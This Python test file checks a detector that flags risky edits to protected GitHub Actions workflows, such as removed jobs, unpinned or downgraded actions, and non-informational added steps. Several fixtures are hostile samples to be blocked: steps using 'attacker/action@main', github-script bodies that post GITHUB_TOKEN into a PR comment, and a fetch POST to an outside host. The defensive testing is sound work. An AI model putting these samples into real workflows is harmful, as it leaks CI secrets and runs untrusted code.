"""Tests for protected quality-gate file detection."""

from __future__ import annotations

import pytest

from awf.control.quality_gates import (
    ProtectedFileDiff,
    find_protected_quality_gate_changes,
)


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        'echo "Tests passed on ${{ github.sha }}"',
        'echo "Run ${{ github.run_id }} passed for PR ${{ github.event.pull_request.number }}"',
        'printf "%s\\n" "${{ steps.test.outcome }}"',
        'printf "%s\\n" "${{ steps.test.conclusion }}"',
        'printf "%s\\n" "${{ needs.validation.result }}"',
    ],
)
def test_added_informational_step_allows_github_actions_expression_echo(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "'echo \"pytest: 3 passed, coverage: 92%\"'",
        'printf "ruff and mypy passed\\n"',
    ],
)
def test_added_informational_step_allows_quoted_validation_words(command: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_existing_informational_step_allows_echo_prose_validation_word_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: echo "Build started"
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: echo "Build finished"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "npm run build",
        "npm --prefix apps/console run build",
        "make lint",
        "python -m build",
        "gcloud run deploy api",
        "npm publish",
    ],
)
def test_added_informational_step_blocks_real_broad_validation_commands(
    command: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Summary report
        run: {command}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Summary report"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "job_field",
    [
        "permissions:\n      contents: write",
        "permissions: write-all",
        "environment: production",
    ],
)
def test_added_informational_job_with_privileged_fields_is_blocked(job_field: str) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
  notify:
    name: Notify reviewers
    runs-on: ubuntu-latest
    {job_field}
    steps:
      - name: Notify reviewers
        run: echo "heads up"
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.notify"
    assert violation.line == 9
    assert "added workflow jobs must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_workflow_removed_job_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
  lint:
    runs-on: ubuntu-latest
    steps:
      - run: uv run ruff check
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    assert violations[0].section == "jobs.lint"
    assert "workflow job removed" in violations[0].reason


@pytest.mark.unit
def test_workflow_boolean_like_job_ids_are_normalized_before_sorting() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  yes:
    runs-on: ubuntu-latest
    steps:
      - run: echo yes
  tests:
    runs-on: ubuntu-latest
    steps:
      - run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs: {}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert [(violation.section, violation.line) for violation in violations] == [
        ("jobs.tests", 8),
        ("jobs.yes", 4),
    ]
    assert all("workflow job removed" in violation.reason for violation in violations)


@pytest.mark.unit
def test_workflow_existing_step_reorder_is_blocked() -> None:
    old_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()
    new_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Publish package
        run: python -m build && twine upload dist/*
      - name: Run tests
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/release.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/release.yml": ProtectedFileDiff(
                path=".github/workflows/release.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.release.steps.Publish package"
    assert violation.line == 7
    assert "workflow step order changed" in violation.reason


@pytest.mark.unit
def test_workflow_added_informational_step_preserves_existing_step_order() -> None:
    old_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()
    new_text = """
name: Release
on: [pull_request]
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Notify reviewers
        run: echo "workflow started"
      - name: Run tests
        run: uv run pytest
      - name: Publish package
        run: python -m build && twine upload dist/*
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/release.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/release.yml": ProtectedFileDiff(
                path=".github/workflows/release.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_to_sha_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert (
        violation.section
        == "jobs.tests.steps.actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683.uses"
    )
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_sha_to_mutable_major_tag_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@v4.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_sha_to_full_semver_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_bump_allows_action_case_change() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: Actions/Checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_downgrade_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v3.0.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/setup-python@v3.0.0.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.parametrize(
    ("old_ref", "new_ref"),
    [
        ("v1.0.0-rc.10", "v1.0.0-rc.2"),
        ("v1.0.0-rc2", "v1.0.0-rc10"),
        ("v1.0.0-rc10", "v1.0.0-rc2"),
    ],
)
@pytest.mark.unit
def test_workflow_pinned_uses_prerelease_downgrade_is_blocked(old_ref: str, new_ref: str) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{old_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{new_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == f"jobs.tests.steps.actions/setup-python@{new_ref}.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_pinned_uses_version_upgrade_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v3.1.0
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.2.0
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.parametrize(
    ("old_ref", "new_ref"),
    [
        ("v1.0.0-rc1", "v1.0.0-rc2"),
        ("v1.0.0-beta2", "v1.0.0-beta3"),
        ("v1.0.0-alpha3", "v1.0.0-alpha4"),
    ],
)
@pytest.mark.unit
def test_workflow_pinned_uses_simple_prerelease_bump_is_allowed(
    old_ref: str,
    new_ref: str,
) -> None:
    old_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{old_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@{new_ref}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_allows_with_input_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.7.0
        with:
          python-version: "3.11"
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5.0.0
        with:
          python-version: "3.12"
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_allows_cache_input_update() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v3.3.2
        with:
          path: .pytest_cache
          key: pytest-linux-v1
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4.2.0
        with:
          path: .pytest_cache
          key: pytest-linux-v2
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_allows_unchanged_sensitive_with_input() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v4.7.0
        with:
          python-version: "3.11"
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/setup-python@v5.0.0
        with:
          python-version: "3.12"
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_workflow_pinned_uses_version_bump_blocks_github_script_input_rewrite() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v6.4.0
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "Validation complete",
            });
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Post PR comment
        uses: actions/github-script@v7.0.0
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "Validation complete for " + context.sha,
            });
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment.with"
    assert "workflow action with inputs changed during pinned ref bump" in violation.reason


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_inputs",
    [
        "          token: ${{ secrets.DEPLOY_KEY }}",
        "          token: custom-token",
        "          path: ${{ secrets.DEPLOY_PATH }}",
    ],
)
def test_workflow_pinned_uses_version_bump_blocks_sensitive_with_input(
    with_inputs: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
{with_inputs}
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@v4.with"
    assert "workflow action with inputs changed during pinned ref bump" in violation.reason


@pytest.mark.unit
def test_workflow_uses_bump_to_mutable_branch_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - name: Run pytest
        run: uv run pytest
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.actions/checkout@main.uses"
    assert "workflow action changed outside pinned ref bump" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Notify reviewers
        uses: attacker/action@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Notify reviewers"
    assert violation.line == 9
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_informational_step_with_untrusted_notify_uses_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - uses: attacker/notify@main
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.attacker/notify@main"
    assert violation.line == 9
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_comment_step_without_script_is_blocked() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason


@pytest.mark.unit
def test_added_github_script_step_with_comment_script_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
def test_added_github_script_step_with_comment_script_and_safe_options_is_allowed() -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
        with:
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: `Validation complete for ${context.sha}`,
            });
          debug: true
          result-encoding: string
          retries: 3
          retry-exempt-status-codes: 400,401
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert violations == []


@pytest.mark.unit
@pytest.mark.parametrize(
    "with_body",
    [
        """
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: "done",
            });
""",
        """
        with:
          script: |
            const content = await github.rest.repos.getContent({
              owner: context.repo.owner,
              repo: context.repo.repo,
              path: "README.md",
            });
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: String(content.data),
            });
""",
        """
        with:
          script: |
            await fetch("https://example.invalid/notify", {
              method: "POST",
              body: context.sha,
            });
""",
        """
        with:
          script: |
            const token = process['env']['GITHUB_TOKEN'];
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: token,
            });
""",
        """
        with:
          script: |
            const token = github.token;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: token,
            });
""",
        """
        with:
          script: |
            const token = context.token;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              body: token,
            });
""",
    ],
)
def test_added_github_script_step_with_script_unsafe_inputs_are_blocked(
    with_body: str,
) -> None:
    old_text = """
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
""".strip()
    new_text = f"""
name: CI
on: [pull_request]
jobs:
  tests:
    runs-on: ubuntu-latest
    steps:
      - name: Run pytest
        run: uv run pytest
      - name: Post PR comment
        uses: actions/github-script@v7
{with_body.rstrip()}
""".strip()

    violations = find_protected_quality_gate_changes(
        changed_paths=[".github/workflows/ci.yml"],
        owned_paths=[],
        protected_file_diffs={
            ".github/workflows/ci.yml": ProtectedFileDiff(
                path=".github/workflows/ci.yml",
                old_text=old_text,
                new_text=new_text,
            )
        },
    )

    assert len(violations) == 1
    violation = violations[0]
    assert violation.section == "jobs.tests.steps.Post PR comment"
    assert "added workflow steps must be informational/comment/notify only" in violation.reason
